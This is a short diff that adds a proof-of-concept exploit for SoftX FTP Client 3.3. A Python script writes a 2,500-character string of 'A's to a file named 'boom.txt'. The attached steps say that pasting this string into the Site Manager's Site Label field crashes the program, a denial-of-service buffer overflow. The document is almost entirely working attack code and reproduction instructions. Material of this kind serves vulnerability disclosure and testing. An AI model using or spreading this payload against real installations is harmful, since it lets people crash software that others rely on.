@@ -1,0 +1,29 @@
+# Exploit Title: SoftX FTP Client 3.3 - Denial of Service (PoC)
+# Discovery by: Cemal Cihad ÇİFTÇİ
+# Discovery Date: 2018-09-24
+# Tested Version: 3.3
+# Vulnerability Type: DOS
+# Tested on OS: Windows XP Professional Service Pack 3
+# Vendor Homepage: www.softx.org
+# Download Link: http://www.softx.org/ftp.html
+
+# Steps to Reproduce: Run the python exploit script, it will create a new
+# file with the name "boom.txt". Copy the content of the new file "boom.txt".
+# Now start the program. Now when you are inside of the program's Site
+# Manager window click "New" > "New Site". In the field: "Site Label" paste
+# the copied content from "boom.txt".
+# Now click "OK" and see a crash!
+
+#!/usr/bin/python
+   
+buffer = "A" * 2500
+
+payload = buffer
+try:
+    f=open("boom.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
